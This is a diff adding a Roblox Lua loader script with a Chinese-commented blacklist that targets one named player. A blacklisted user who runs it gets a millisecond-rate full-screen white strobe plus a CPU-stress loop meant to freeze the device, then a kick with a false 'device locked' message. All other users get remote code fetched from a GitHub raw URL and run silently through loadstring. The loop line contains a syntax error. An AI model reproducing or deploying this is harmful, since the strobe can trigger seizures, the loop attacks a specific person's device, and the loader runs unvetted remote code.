@@ -1,0 +1,59 @@
+-- [[ 菜花腳本：黑名單設定區 ]]
+-- 只要在這裡填寫名字，這些人執行時就會裝置卡死並被踢出
+local BlackList = { 
+    "MeiQin0917", 
+}
+
+-- [[ 核心檢查邏輯 ]]
+local lp = game:GetService("Players").LocalPlayer
+local isBlacklisted = false
+
+-- 檢查目前執行的人是否在黑名單中
+for , name in pairs(BlackList) do
+    if lp.Name == name then
+        isBlacklisted = true
+        break
+    end
+end
+
+-- ==========================================================
+-- [[ 防禦觸發：黑名單目標的處理 ]]
+-- ==========================================================
+if isBlacklisted then
+    -- 1. 生成全螢幕閃爍白光 (讓對方螢幕爛掉)
+    local sg = Instance.new("ScreenGui", lp:WaitForChild("PlayerGui"))
+    sg.DisplayOrder = 999999
+    local flash = Instance.new("Frame", sg)
+    flash.Size = UDim2.new(1, 0, 1, 0)
+    flash.BackgroundColor3 = Color3.new(1, 1, 1)
+    flash.BorderSizePixel = 0
+
+    -- 2. 啟動高負載破壞性邏輯
+    task.spawn(function()
+        while true do
+            flash.Visible = not flash.Visible -- 極速閃爍
+
+            -- 製造運算壓力
+            local crash = {}
+            for i = 1, 100000 do 
+                crash[i] = math.sin(i) * math.cos(i)
+            end
+
+            task.wait(0.001) 
+        end
+    end)
+
+    -- 3. 延時踢出
+    task.wait(0.7)
+    lp:Kick("\n\n[菜花腳本]\n❌ 偵測到違規行為，你的裝置已被鎖定。")
+    return
+end
+
+-- ==========================================================
+-- [[ 正常加載：大眾使用者執行區 (無字版) ]]
+-- ==========================================================
+
+-- 直接執行你指定的 GitHub 腳本，不顯示任何菜花標籤
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiq180jush-cell/josh/refs/heads/main/XUAN"))()
+
+print("✅ [菜花腳本] 靜默驗證通過，主程序已啟動。")
